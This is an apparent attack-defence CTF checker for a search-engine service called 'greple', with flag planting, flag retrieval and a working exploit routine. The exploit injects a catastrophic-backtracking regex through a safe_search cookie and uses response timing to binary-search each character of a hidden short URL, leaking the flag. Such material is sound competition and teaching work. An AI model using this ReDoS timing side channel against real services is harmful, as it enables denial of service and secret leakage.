"""Checker for greple service."""

import asyncio
import hashlib
import json
import logging
import math
import pathlib
import random
import re
import string
from collections.abc import Sequence
from html import escape
from typing import NamedTuple
from urllib.parse import parse_qs, quote, unquote, urlencode

import fastapi
import httpx
from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import assert_equals, assert_in

_CHECKER = Enochecker("greple", 7777)

with (pathlib.Path.cwd() / "words.json").open() as f:
    _WORDS: list[str] = json.load(f)

_REGEX_ESCAPE = {ord(c): rf"\{c}" for c in r"^$.*?+{|()\["}

_FLAG_URL_IPV4 = "1.1.1.1"
_FLAG_URL_PORT = 80

_SHORT_URL_PREFIX = "/u/"
_SHORT_URL_ALPHABET = string.digits + string.ascii_lowercase[: 16 - len(string.digits)]
_SHORT_URL_LENGTH = 64 // 4
_SHORT_URL_REGEX = (
    f"{_SHORT_URL_PREFIX.translate(_REGEX_ESCAPE)}"
    f"[{_SHORT_URL_ALPHABET.translate(_REGEX_ESCAPE)}]"
    f"{{{_SHORT_URL_LENGTH}}}"
    r"\b"
)


def _cookieencode(query: dict[str, str]) -> str:
    return urlencode(query, quote_via=quote)


def _noise(alphabet: Sequence[str], sep: str, entropy: int) -> str:
    n = math.ceil(entropy / math.log2(len(alphabet)))
    return sep.join(random.choice(alphabet) for _ in range(n))


def _printable_noise(entropy: int) -> str:
    return _noise(string.printable, "", entropy)


def _lower_noise(entropy: int) -> str:
    return _noise(string.ascii_lowercase, "", entropy)


def _alnum_noise(entropy: int) -> str:
    return _noise(string.ascii_letters + string.digits, "", entropy)


def _word_noise(entropy: int) -> str:
    return _noise(_WORDS, " ", entropy)


async def _register_user(client: httpx.AsyncClient, username: str) -> str:
    res = await client.get("/preferences")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/preferences",
        data={
            "username": username,
            "password": _printable_noise(2**7),
            "form_user_account": "Login",
        },
    )
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    if res.next_request is None:
        raise MumbleException("No redirect")
    assert_in("user_account", res.cookies, "No user_account cookie")
    cookie = parse_qs(res.cookies["user_account"])
    assert_in("username", cookie, "No username in cookie")
    assert_equals(cookie["username"], [username], "Unexpected username in cookie")
    assert_in("hmac", cookie, "No hmac in cookie")
    assert_equals(len(cookie["hmac"]), 1, "Unexpected hmac in cookie")

    res = await client.send(res.next_request)
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(username)}"', res.text, "Unexpected form value")

    return cookie["hmac"][0]


async def _register_domain(client: httpx.AsyncClient, domain: str) -> None:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={
            "domain": domain,
            "ipv4": _FLAG_URL_IPV4,
            "port": _FLAG_URL_PORT,
            "form_register_domain": "Register",
        },
    )
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    if res.next_request is None:
        raise MumbleException("No redirect")

    res = await client.send(res.next_request)
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(escape(domain), res.text, "Unexpected table value")


async def _submit_page(client: httpx.AsyncClient, domain: str, text: str) -> None:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={
            "domain": hashlib.sha224(domain.encode()).hexdigest(),
            "path": "/",
            "title": _word_noise(2**4),
            "text": text,
            "form_submit_page": "Submit",
        },
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in("page has been submitted", res.text, "Unexpected form value")


async def _shorten_url(client: httpx.AsyncClient, domain: str, path: str) -> str:
    res = await client.get("/console")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    res = await client.post(
        "/console",
        data={
            "domain": hashlib.sha224(domain.encode()).hexdigest(),
            "path": path,
            "form_shorten_url": "Shorten",
        },
    )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    return short_url[0]


async def _search(client: httpx.AsyncClient, q: str) -> httpx.Response:
    res = await client.get("/")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    query = urlencode({"q": q, "btnG": "Greple Search"})
    res = await client.get(f"/search?{query}")
    assert_equals(res.status_code, 200, "Unexpected HTTP status")
    assert_in(f'value="{escape(q)}"', res.text, "Unexpected form value")
    # TODO: more checks
    # TODO: add checks for result number and timing output

    return res


async def _get_short_url(client: httpx.AsyncClient, short_url: str) -> str:
    res = await client.get(short_url)
    assert_equals(res.status_code, 302, "Unexpected HTTP status")
    try:
        return res.headers["Location"]
    except KeyError as e:
        raise MumbleException("Failed to get Location header") from e


@_CHECKER.putflag(0)
async def _putflag(task: PutflagCheckerTaskMessage, client: httpx.AsyncClient, db: ChainDB) -> str:
    username = _alnum_noise(2**7)
    hmac = await _register_user(client, username)

    domain = f"{_lower_noise(2**7)}.com"
    await _register_domain(client, domain)

    url = await _shorten_url(client, domain, f"/{quote(task.flag)}")

    await _submit_page(client, domain, url)

    await db.set("username", username)
    await db.set("hmac", hmac)
    await db.set("domain", domain)

    return domain


@_CHECKER.getflag(0)
async def _getflag(task: GetflagCheckerTaskMessage, client: httpx.AsyncClient, db: ChainDB) -> None:
    try:
        username = await db.get("username")
        hmac = await db.get("hmac")
        domain = await db.get("domain")
    except KeyError as e:
        raise MumbleException("Missing putflag data in DB") from e

    client.cookies["user_account"] = _cookieencode({"username": username, "hmac": hmac})

    res = await _search(client, f"site:{domain}")
    short_url = re.search(_SHORT_URL_REGEX, res.text)
    if not short_url:
        raise MumbleException("Failed to find short URL")

    url = await _get_short_url(client, short_url[0])
    assert_in(quote(task.flag), url, "Flag missing")


async def _time_redos(client: httpx.AsyncClient, sem: asyncio.Semaphore, n: int, domain: str, regex: str) -> float:
    mid = len(_SHORT_URL_PREFIX) // 2
    pre, char, suf = (
        _SHORT_URL_PREFIX[:mid].translate(_REGEX_ESCAPE),
        _SHORT_URL_PREFIX[mid].translate(_REGEX_ESCAPE),
        _SHORT_URL_PREFIX[mid + 1 :].translate(_REGEX_ESCAPE),
    )
    redos = pre + f"{char}*" * n + suf

    async with sem:
        res = await client.get(
            "/search?" + urlencode({"q": f"site:{domain}"}),
            cookies={"safe_search": _cookieencode({"enabled": "on", "regex": redos + regex})},
        )
    assert_equals(res.status_code, 200, "Unexpected HTTP status")

    t = re.search(r"\b[0-9]\.[0-9]{3}\b", res.text)
    if not t:
        raise MumbleException("Failed to find timing output")

    return float(t[0])


async def _sample_redos_time(
    client: httpx.AsyncClient,
    sem: asyncio.Semaphore,
    n: int,
    domain: str,
    regex: str,
) -> float:
    aws = (_time_redos(client, sem, n, domain, regex) for _ in range(10))
    return sum(await asyncio.gather(*aws)) / 10


class _ReDoSCalibration(NamedTuple):
    sem: asyncio.Semaphore
    n: int
    bound: float


async def _calibrate_redos(
    logger: logging.LoggerAdapter,
    client: httpx.AsyncClient,
    sem: asyncio.Semaphore,
) -> _ReDoSCalibration:
    await _register_user(client, _alnum_noise(2**7))

    domain = f"{_lower_noise(2**7)}.com"
    await _register_domain(client, domain)

    await _submit_page(client, domain, f"{_SHORT_URL_PREFIX}abc")

    for n in range(5, 20):
        match_time = await _sample_redos_time(client, sem, n, domain, "abc")
        nomatch_time = await _sample_redos_time(client, sem, n, domain, "xyz")

        logger.info("match took %r seconds with n=%d", match_time, n)
        logger.info("nomatch took %r seconds with n=%d", nomatch_time, n)

        if nomatch_time > match_time and nomatch_time >= 5 * match_time:
            return _ReDoSCalibration(sem, n, (match_time + nomatch_time) / 2)

    raise MumbleException("Couldn't calibrate ReDoS timing")


async def _redos_match(
    logger: logging.LoggerAdapter,
    client: httpx.AsyncClient,
    cal: _ReDoSCalibration,
    domain: str,
    regex: str,
) -> bool:
    t = await _time_redos(client, cal.sem, cal.n, domain, regex)
    logger.info("redos search took %r seconds", t)
    return t < cal.bound


async def _exploit_sca_letter(
    logger: logging.LoggerAdapter,
    client: httpx.AsyncClient,
    cal: _ReDoSCalibration,
    attack_info: str,
    idx: int,
) -> str:
    lo = 0
    hi = len(_SHORT_URL_ALPHABET) - 1

    while lo < hi:
        mid = (lo + hi) // 2

        if await _redos_match(
            logger,
            client,
            cal,
            attack_info,
            "[0-9a-f]" * idx
            + "["
            + _SHORT_URL_ALPHABET[lo : mid + 1].translate(_REGEX_ESCAPE)
            + "]"
            + "[0-9a-f]" * (_SHORT_URL_LENGTH - idx - 1),
        ):
            hi = mid
        else:
            lo = mid + 1

    return _SHORT_URL_ALPHABET[lo]


@_CHECKER.exploit(0)
async def _exploit_sca(
    logger: logging.LoggerAdapter,
    client: httpx.AsyncClient,
    task: ExploitCheckerTaskMessage,
) -> str:
    if task.attack_info is None:
        raise MumbleException("Missing attack info")

    cal = await _calibrate_redos(logger, client, asyncio.Semaphore(2))

    aws = (_exploit_sca_letter(logger, client, cal, task.attack_info, i) for i in range(_SHORT_URL_LENGTH))
    short_url = _SHORT_URL_PREFIX + "".join(await asyncio.gather(*aws))

    url = await _get_short_url(client, short_url)
    return unquote(url.removeprefix(f"http://{_FLAG_URL_IPV4}:{_FLAG_URL_PORT}/"))


def app() -> fastapi.FastAPI:
    """Return app to gunicorn."""
    return _CHECKER.app
